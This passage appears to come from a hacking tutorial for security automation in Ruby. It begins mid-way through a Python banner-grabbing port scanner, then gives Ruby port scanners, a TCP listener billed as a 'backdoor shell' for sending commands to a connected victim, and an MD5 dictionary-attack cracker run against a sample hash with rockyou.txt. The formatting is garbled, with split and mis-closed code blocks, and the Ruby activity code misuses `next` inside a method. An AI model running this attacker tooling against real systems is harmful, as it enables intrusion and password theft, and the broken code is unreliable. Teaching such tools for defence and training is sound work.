def scan_port(ip, port):  
    try:  
        sock = socket.socket()  
        sock.settimeout(1)  
        sock.connect((ip, port))  
        sock.send(b"GET / HTTP/1.1\r\n\r\n")  
        banner = sock.recv(1024).decode().strip()  
        print(f"[+] Port {port} open - {banner}")  
    except:  
        pass  

target = "192.168.1.1"  
for port in [21, 22, 80, 443]:  
    scan_port(target, port)  

    Run it:
```
```bash

python3 port_scanner.py  
```
# Ruby Scripting for Hackers
Objectives

Learn Ruby basics for security automation
Build TCP clients/servers for networking tasks
Create a password cracker (dictionary attack)
Write a port scanner with banner grabbing

Lessons
1. Ruby Basics
Variables & Loops
```ruby

#_Variables_  
target = "192.168.1.1"  

#_Loops_  
(1..100).each do |port|  
  puts "Scanning port #{port}"  
end  

#_Functions_
ruby

def scan_port(ip, port)  
  begin  
    socket = Socket.new(:INET, :STREAM)  
    socket.connect(Socket.pack_sockaddr_in(port, ip))  
    puts "[+] Port #{port} open"  
  rescue  
    # Port closed or filtered  
  end  
end  
```
2. Networking (TCP Clients & Listeners)

TCP Client (Port Scanner)
```ruby

require 'socket'  

target = "192.168.1.1"  

(1..100).each do |port|  
  begin  
    socket = Socket.new(:INET, :STREAM)  
    socket.connect(Socket.pack_sockaddr_in(port, target))  
    puts "Port #{port} is open"  
    socket.close  
  rescue  
    next  
  end  
end  
```
TCP Listener (Backdoor Shell)
```ruby

require 'socket'  

server = TCPServer.new("0.0.0.0", 4444)  
puts "Listening..."  

loop do  
  client = server.accept  
  puts "Connected to #{client.peeraddr}"  

  loop do  
    print "$ "  
    cmd = gets  
    client.puts cmd  
    puts client.recv(1024)  
  end  
end  
```
3. Password Cracker (Dictionary Attack)
```ruby

require 'digest'  

def crack_hash(hash, wordlist)  
  File.foreach(wordlist) do |word|  
    word = word.chomp  
    guess = Digest::MD5.hexdigest(word)  
    if guess == hash  
      return "Password found: #{word}"  
    end  
  end  
  "Password not found"  
end  

puts crack_hash("5f4dcc3b5aa765d61d8327deb882cf99", "rockyou.txt")  
```
**Activities**
1. Write a Port Scanner with Banner Grabbing

Task:

    Create port_scanner.rb:

```ruby

require 'socket'  

def scan_port(ip, port)  
  begin  
    socket = Socket.new(:INET, :STREAM)  
    socket.connect(Socket.pack_sockaddr_in(port, ip))  
    socket.puts "GET / HTTP/1.1\r\n\r\n"  
    banner = socket.recv(1024).strip  
    puts "[+] Port #{port} open - #{banner}"  
    socket.close  
  rescue  
    next  
  end  
end  

target = "192.168.1.1"  
[21, 22, 80, 443].each { |p| scan_port(target, p) }  

    Run it:
```

```bash

ruby port_scanner.rb
```  
